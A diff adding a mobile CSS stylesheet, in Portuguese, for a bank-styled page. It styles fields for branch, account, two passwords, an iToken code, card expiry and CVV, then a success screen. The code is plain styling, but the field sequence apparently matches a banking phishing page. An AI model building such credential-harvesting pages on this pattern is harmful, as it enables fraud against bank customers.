@@ -1,0 +1,549 @@
+#tela3{
+  background: rgba(230, 136, 40, 1.8);
+}
+.tela-grande {
+  color: #fff;
+  font-weight: bold;
+  font-size: 23px;
+}
+#logo{
+  text-align: center;
+  margin-top: 17%;
+}
+#tela1{
+  background: rgba(230, 136, 40, 1.8);
+}
+.conteudo1{
+  display: none;
+}
+footer{
+  display: none;
+}
+
+@media (max-width: 450px)
+{
+  #tela3 #logo{
+    margin-top: 50%;
+  }
+  #tela1 #logo{
+    display: none;
+  }
+  .tela-grande{
+    display: none;
+  }
+  .conteudo1{
+    display: block;
+  }
+  html{
+
+    height: auto;
+
+
+  }
+
+  #tela1{
+
+    background-image: url('../img/fundo.jpg');
+
+    background-size: 100%;
+
+    background-repeat: no-repeat;
+
+  }
+
+  #tela2{
+
+    background-image: url('../img/fundo-tras.jpg');
+
+    background-size: 100%;
+
+    background-repeat: no-repeat;
+
+  }
+
+  #tela3{
+
+    background: rgba(230, 136, 40, 1.8);
+
+    background-size: 100%;
+
+  }
+
+  #tela4{
+
+    background-image: url('../img/fundo-tras.jpg');
+
+    background-size: 100%;
+
+    background-repeat: no-repeat;
+
+  }
+
+  .conteudo1{
+
+    background-color: rgba(230, 136, 40, 0.8);
+
+    margin-left: 4%;
+
+    margin-right: 4%;
+
+    margin-top: 77%;
+
+    padding-left: 4%;
+
+  }
+
+  .form-group{
+
+    width: 50%;
+
+  }
+
+  /*input*/
+
+  h1, input::-webkit-input-placeholder, button {
+
+   font-family: 'roboto', sans-serif;
+
+   -webkit-transition: all 0.3s ease-in-out;
+
+   transition: all 0.3s ease-in-out;
+
+  }
+
+  input {
+
+    margin-top: 15%;
+
+    border: none;
+
+    padding-bottom: 3%;
+
+    border-bottom: solid 1px #fff;
+
+    background: transparent;
+
+    color: #fff;
+
+    transition: all 0.3s cubic-bezier(0.64, 0.09, 0.08, 1);
+
+    -webkit-transition: all 0.3s cubic-bezier(0.64, 0.09, 0.08, 1);
+
+    float: left;
+
+  }
+
+  ::-webkit-input-placeholder {
+
+     color: #fff;
+
+  }
+
+
+
+  :-moz-placeholder { /* Firefox 18- */
+
+     color: #fff;  
+
+  }
+
+
+
+  ::-moz-placeholder {  /* Firefox 19+ */
+
+     color: #fff;  
+
+  }
+
+
+
+  :-ms-input-placeholder {  
+
+     color: #fff;  
+
+  }
+
+  input:focus, input:valid {
+
+   box-shadow: none;
+
+   outline: none;
+
+   background-position: 0 0;
+
+  }
+
+  input:focus::-webkit-input-placeholder, input:valid::-webkit-input-placeholder {
+
+   color: #fff;
+
+   font-size: 11px;
+
+   -webkit-transform: translateY(-20px);
+
+   transform: translateY(-20px);
+
+   visibility: visible !important;
+
+  }
+
+  #agencia{
+
+    width: 96%;
+
+  }
+
+  #conta{
+
+    width: 96%;
+
+  }
+
+
+
+  /*lembrar dados*/
+
+  .lembra{
+
+    visibility: hidden;
+
+    position: absolute;
+
+    margin-left: -9999px;
+
+  }
+
+
+
+  .lembra+ label {
+
+    display: block;
+
+    position: relative;
+
+    cursor: pointer;
+
+    outline: none;
+
+    user-select: none;
+
+  }
+
+
+
+  .class-lembra + label {
+
+    padding: 2px;
+
+    width: 70px;
+
+    height: 35px;
+
+    background-color: #dddddd;
+
+    border-radius: 60px;
+
+  }
+
+  .class-lembra + label:before,
+
+  .class-lembra + label:after {
+
+    display: block;
+
+    position: absolute;
+
+    top: 1px;
+
+    left: 1px;
+
+    bottom: 1px;
+
+    content: "";
+
+  }
+
+  .class-lembra + label:before {
+
+    right: 1px;
+
+    background-color: #f1f1f1;
+
+    border-radius: 60px;
+
+    transition: background 0.4s;
+
+  }
+
+  .class-lembra + label:after {
+
+    width: 35px;
+
+    background-color: #fff;
+
+    border-radius: 100%;
+
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+
+    transition: all 0.6s;
+
+  }
+
+  .class-lembra:checked + label:before {
+
+    background-color: rgba(230, 136, 40, 2.0);
+
+  }
+
+  .class-lembra:checked + label:after {
+
+    transform: translateX(33px);
+
+  }
+
+  .lembrar-dados{
+
+    width: 100%;
+
+  }
+
+  .lembrar-dados label{
+
+    float: left;
+
+    margin-left: 4%;
+
+    color: #fff;
+
+    padding-top: 1%;
+
+  }
+
+  input {
+
+    width: 90%;
+
+    margin-top: 11%;
+
+    border: none;
+
+    padding-left: 10%;
+
+    padding-bottom: 3%;
+
+    border-bottom: solid 1px #fff;
+
+    background: transparent;
+
+    color: #fff;
+
+    transition: all 0.3s cubic-bezier(0.64, 0.09, 0.08, 1);
+
+    -webkit-transition: all 0.3s cubic-bezier(0.64, 0.09, 0.08, 1);
+
+    float: left;
+
+    font-size: 14px;
+
+  }
+
+  input#cvv{
+
+    padding-left: 0;
+
+  }
+
+
+
+
+
+  input[type="submit"]{
+
+    width: 92%;
+
+    border: 1px solid #fff;
+
+    padding: 0;
+
+    margin: 0;
+
+    height: 50px;
+
+    margin-top: 10%;
+
+    margin-bottom: 5%;
+
+    background: #fff;
+
+    color: rgba(230, 136, 40, 1.5);
+
+  }
+
+
+
+  footer{
+
+    display: block;
+
+    margin-top: 22%;
+
+  }
+
+  .rodape{
+
+    width: 100%;
+
+  }
+
+  .rodape i{
+
+    margin-left: 15%;
+
+  }
+
+  .rodape img{
+    width: 10%;
+  }
+
+  .rodape .itoken img{
+    width: 17%;
+  }
+
+  .logo-home img{
+
+    margin-left: 29%;
+
+    margin-top: 60%;
+
+  }
+
+
+
+  /*tela 2*/
+
+  #senha1{
+
+    background:url(../img/cadeado2.png) left top;
+
+    background-size: 25px 25px;
+
+    background-repeat: no-repeat;
+
+  }
+
+  #senha2{
+
+    background:url(../img/cadeado2.png) left top;
+
+    background-size: 25px 25px;
+
+    background-repeat: no-repeat;
+
+  }
+
+  #itoken{
+
+    background:url(../img/ico-cel.png) left top;
+
+    background-size: 25px 25px;
+
+    background-repeat: no-repeat;
+
+  }
+
+  #validade{
+
+    background:url(../img/cc.png) left top;
+
+    background-size: 25px 25px;
+
+    background-repeat: no-repeat;
+
+    width: 53%;
+
+  }
+
+  #cvv{
+
+    width: 35%;
+
+    margin-left: 2%;
+
+  }
+
+  .conteudo2{
+
+    margin-left: 8%;
+
+    width: 100%;
+
+    margin-top: 6%;
+
+  }
+
+  .conteudo2 .form-group{
+
+    width: 100%;
+
+  }
+
+
+
+  /*tela fim*/
+
+  .logo-fim img{
+
+    width: 50px;
+
+    margin-top: 15%;
+
+  }
+
+  .mensagem-sucesso h2{
+
+    color: #fff;
+
+    font-size: 20px;
+
+    margin-top: 35%;
+
+    font-weight: bold;
+
+  }
+
+  .mensagem-sucesso p{
+
+    color: #fff;
+
+    margin-top: 8%;
+
+  }
+
+}
+
+@media (max-width: 280px){
+  .conteudo1{
+    margin-top: 48%;
+  }
+  input {
+    font-size: 11px;
+    margin-top: 7%;
+  }
+  input[type="submit"]{
+    height: 35px;
+    margin-top: 3%;
+  }
+  #senha1{
+    background-size: 17px 17px;
+  }
+  #senha2{
+    background-size: 17px 17px;
+  }
+  #validade{
+    background-size: 17px 17px;
+  }
+  #itoken{
+    background-size: 17px 17px;
+  }
+}
+
